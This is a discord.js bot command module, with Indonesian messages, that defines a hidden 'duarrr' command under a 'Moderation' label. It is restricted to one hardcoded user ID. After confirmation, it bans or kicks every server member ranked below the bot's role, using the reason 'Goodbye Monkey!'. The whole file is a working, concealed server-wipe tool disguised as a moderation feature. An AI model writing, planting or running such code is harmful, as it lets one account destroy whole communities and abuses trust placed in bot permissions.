const { PermissionsBitField } = require('discord.js');

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports = {
  name: 'duarrr',
  description: 'Fitur khusus Penduduk Langit.',
  category: 'Moderation',
  hidden: true,
  async execute(message, args) {
    const ownerId = '1459280383320260746';
    const action = args[0]?.toLowerCase();
    const limitArg = args[1];
    const limit = limitArg ? parseInt(limitArg) : null;

    if (message.author.id !== ownerId) {
      return message.reply('❌ Command ini hanya bisa digunakan oleh **owner bot**.');
    }

    if (!['ban', 'kick'].includes(action)) {
      return message.reply('❌ Format salah!\nGunakan: `!duarrr ban [jumlah]` atau `!duarrr kick [jumlah]`');
    }

    if (limit !== null && (isNaN(limit) || limit <= 0)) {
      return message.reply('❌ Jumlah harus berupa angka positif.');
    }

    const botMember = await message.guild.members.fetchMe();

    if (action === 'ban' && !botMember.permissions.has(PermissionsBitField.Flags.BanMembers)) {
      return message.reply('❌ Bot tidak punya izin untuk ban members.');
    }

    if (action === 'kick' && !botMember.permissions.has(PermissionsBitField.Flags.KickMembers)) {
      return message.reply('❌ Bot tidak punya izin untuk kick members.');
    }

    const confirmMsg = await message.channel.send(
      `⚠️ Apakah kamu yakin ingin menjalankan **${action} massal**${limit ? ` (${limit} member)` : ''}?` +
      '\nKetik `yes` untuk konfirmasi, `no` untuk batal.'
    );

    const filter = m => ['yes', 'no'].includes(m.content.toLowerCase()) && m.author.id === message.author.id;

    try {
      const collected = await message.channel.awaitMessages({ filter, max: 1, time: 30000, errors: ['time'] });
      const reply = collected.first().content.toLowerCase();

      if (reply === 'no') {
        await message.channel.send('❌ Perintah dibatalkan oleh pengguna.');
        return;
      }

      if (reply === 'yes') {
        const statusMessage = await message.channel.send(`⚠️ Menjalankan **${action} massal**${limit ? ` (${limit} member)` : ''}, mohon tunggu...`);

        const members = await message.guild.members.fetch();
        const affected = [];
        const failed = [];

        for (const [id, member] of members) {
          if (
            member.user.bot ||
            member.id === message.author.id ||
            member.id === botMember.id
          ) continue;

          const botHighestRole = botMember.roles.highest;
          const memberHighestRole = member.roles.highest;

          if (memberHighestRole.position < botHighestRole.position) {
            try {
              if (action === 'ban') {
                await member.ban({ reason: 'Goodbye Monkey!' });
              } else {
                await member.kick('Goodbye Monkey!');
              }
              affected.push(`<@${member.id}>`);
              await delay(200);
            } catch (err) {
              failed.push(`${member.user.tag} (${err.message})`);
            }
          }
          if (limit && affected.length >= limit) break;
        }

        let result = `✅ **Sukses ${action}:** ${affected.length} member\n`;
        if (affected.length > 0) {
          result += `${affected.join(', ')}\n`;
        }
        if (failed.length > 0) {
          result += `\n❌ **Gagal ${action}:**\n${failed.join('\n')}`;
        }

        await statusMessage.edit(result || 'Tidak ada member yang diproses.');
        await message.channel.send('✅ Eksekusi selesai.');
      }
    } catch {
      await message.channel.send('⌛ Waktu konfirmasi habis, perintah dibatalkan.');
    }
  }
};
